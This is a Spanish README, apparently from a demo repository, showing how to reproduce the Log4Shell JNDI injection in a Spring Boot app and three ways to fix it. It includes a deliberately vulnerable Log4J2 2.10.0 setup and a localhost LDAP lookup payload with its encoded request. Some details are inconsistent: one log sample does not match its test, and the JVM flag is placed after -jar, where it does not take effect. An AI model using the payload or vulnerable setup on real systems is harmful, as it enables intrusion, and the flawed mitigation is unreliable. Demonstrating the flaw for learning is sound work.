# Log4J2 Vulnerability and Spring Boot

Según el comunicado oficial:

Spring Boot users are only affected by this vulnerability if they have 
switched the default logging system to Log4J2. The log4j-to-slf4j and 
log4j-api jars that we include in spring-boot-starter-logging cannot be 
exploited on their own. Only applications using log4j-core and including 
user input in log messages are vulnerable.

[Log4J2 vulnerability Springboot](https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot)

# Como reproducir la vulnerabilidad

Dentro del POM excluir el loggin default mediante la siguiente configuración en el POM
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <exclusions>
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.10.0</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.10.0</version>
</dependency>
```
### Prueba sin incidentes
El aplicativo cuenta con un método GET recibe un parámetro el cual se escribe en log mediante LogManager.
Para probar ejecutar el siguiente método en algun navegador o herramienta de peticiones REST.  
GET  
http://localhost:8080/vuln&input=HolaMundo

El resultado es la escritura de "HolaMundo dentro del log de forma normal"

```
INFO 86203 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : FrameworkServlet 'dispatcherServlet': initialization started
INFO 86203 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : FrameworkServlet 'dispatcherServlet': initialization completed in 12 ms
INFO 86203 --- [nio-8080-exec-1] c.e.v.VulnController                     : Input: ${jndi:ldap://127.0.0.1:3089/}
```

### Prueba con instrucción JNDI

Necesitamos generar una instrucción de consulta JNDI, en este ejemplo se intenta una conexión a LDAP.  
```
${jndi:ldap://127.0.0.1:3089/}
```

Para enviar esta instrucción mediante el método GET la normalizamos mediante algún servicio de encoder  
https://www.urlencoder.org/

URL Encode:
%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A3089%2F%7D

Ejecutamos la misma consulta del ejercicio pasado y veremos como se lanza una consulta JNDI en lugar 
de solo pintar en log  
GET  
http://localhost:8080/vuln&input=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A3089%2F%7D

```
INFO 86256 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : FrameworkServlet 'dispatcherServlet': initialization started
INFO 86256 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : FrameworkServlet 'dispatcherServlet': initialization completed in 13 ms
http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1:3089/]. javax.naming.CommunicationException: 127.0.0.1:3089 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
	at java.naming/com.sun.jndi.ldap.Connection.<init>(Connection.java:244)
```

### Corrección de vulnerabilidad

#### Método 1:

Basta agregar la siguiente línea de configuración a la JVM.
```
java -jar [app.jar] -Dlog4j2.formatMsgNoLookups=true
```
Nota: se tiene que agregar al momento de invocar la JVM, de nada sirve agregarlo al application.properties.  

#### Método 2:
Utilizar la librería propia de Springboot sin la exclusión mencionada al inicio  
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.10.0</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.10.0</version>
</dependency>
```  
Nota: Aunque tengamos la siguiente estructura, sino especificamos la exclusión, no importa que esten especificadas
las dependencias de log4j, Springboot las va a ignorar y no tendremos la vulnerabilidad.  

#### Método 3:
Hacer el upgrade de log4j a la versión 2.16 que soluciona este incidente.  
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <exclusions>
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.16.0</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.16.0</version>
</dependency>
```

## Contributors

Javier Rodríguez
